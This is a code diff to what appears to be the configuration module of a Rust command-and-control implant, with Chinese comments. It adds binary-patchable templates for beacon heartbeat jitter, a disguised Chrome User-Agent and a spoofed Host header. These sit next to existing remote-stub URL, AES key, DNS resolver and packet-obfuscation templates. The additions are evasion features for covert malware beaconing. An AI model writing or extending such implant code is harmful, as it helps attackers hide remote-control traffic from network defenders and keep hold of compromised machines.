@@ -12,6 +12,7 @@ pub const AES_KEY: &str = "REPLACE_ME_AES_KEY";
 pub const REMOTE_STUB: &str = "REPLACE_ME_URL";
 pub const ENCRYPTION_SALT: &str = "REPLACE_ME_SALT";
 pub const OBFUSCATION_MODE: &str = "REPLACE_ME_OBF";
+pub const JITTER: &str = "REPLACE_ME_JITTER";
 
 ///服务器 URL 模板 (64 字节)
 #[no_mangle]
@@ -51,10 +52,25 @@ pub static DNS_RESOLVER_TEMPLATE: [u8; 64] = *b"SYSTEM_NETWORK_STUB_RESOLVER_64_
 #[used]
 pub static ENCRYPTION_SALT_TEMPLATE: [u8; 32] = *b"SYSTEM_PROVIDER_CRYPTO_KDF_SALT_";
 
+/// 心跳抖动 (Jitter) 模板 (16 字节) - 0 到 100 之间的百分比
+#[no_mangle]
+#[used]
+pub static JITTER_TEMPLATE: [u8; 16] = *b"JT_DATA_INT_0030";
+
 /// 报文混淆模式模板 (15 字节)
 #[no_mangle]
 #[used]
 pub static PACKET_OBFUSCATION_TEMPLATE: [u8; 15] = *b"OBF_MODE_STRICT";
+
+/// User-Agent 伪装模板 (128 字节)
+#[no_mangle]
+#[used]
+pub static UA_TEMPLATE: [u8; 128] = *b"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36XXXXXXXXXXXXXXXXX";
+
+/// Host 域名伪装模板 (64 字节)
+#[no_mangle]
+#[used]
+pub static HOST_TEMPLATE: [u8; 64] = *b"SYSTEM_CONFIG_DATA_HOST_MAPPING_PLACEHOLDER_XXXXXXXXXXXXXXXXXXXX";
 
 /// 默认调试服务器地址
 pub fn get_default_debug_url() -> String {
@@ -221,6 +237,48 @@ pub fn get_heartbeat_interval() -> u64 {
             DEFAULT_HEARTBEAT_INTERVAL
         }
     }
+}
+
+/// 获取心跳抖动百分比 (0-100)
+pub fn get_heartbeat_jitter() -> u64 {
+    // 1. 优先使用源码修补的值 (REPLACE_ME_JITTER)
+    if JITTER != "REPLACE_ME_JITTER" {
+        if let Ok(v) = JITTER.parse::<u64>() {
+            return v;
+        }
+    }
+
+    // 2. 否则使用二进制模板修补的值
+    String::from_utf8_lossy(&JITTER_TEMPLATE)
+        .split('_')
+        .last()
+        .and_then(|s| s.trim_matches('\0').parse::<u64>().ok())
+        .unwrap_or(30) // 默认 30% 抖动
+}
+
+/// 获取伪装 User-Agent
+pub fn get_ua() -> String {
+    let template_str = String::from_utf8_lossy(&UA_TEMPLATE);
+    template_str
+        .trim_matches('\0')
+        .trim_matches('X')
+        .trim()
+        .to_string()
+}
+
+/// 获取伪装 Host Header
+pub fn get_host_header() -> Option<String> {
+    let template_str = String::from_utf8_lossy(&HOST_TEMPLATE);
+    if template_str.contains("HOST_MAPPING") {
+        return None;
+    }
+    let val = template_str
+        .trim_matches('\0')
+        .trim_matches('X')
+        .trim_matches('_')
+        .trim()
+        .to_string();
+    if val.is_empty() { None } else { Some(val) }
 }
 
 /// 获取 DNS 解析器地址
